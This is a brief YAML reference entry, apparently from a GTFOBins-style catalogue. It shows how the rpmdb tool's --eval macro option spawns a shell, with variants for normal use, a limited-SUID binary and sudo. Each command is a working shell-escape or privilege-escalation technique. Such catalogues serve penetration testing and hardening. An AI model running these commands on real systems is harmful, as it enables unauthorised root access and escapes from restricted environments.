---
functions:
  shell:
    - code: rpmdb --eval '%(/bin/sh 1>&2)'
  limited-suid:
    - code: ./rpmdb --eval '%(/bin/sh 1>&2)'
  sudo:
    - code: sudo rpmdb --eval '%(/bin/sh 1>&2)'
---
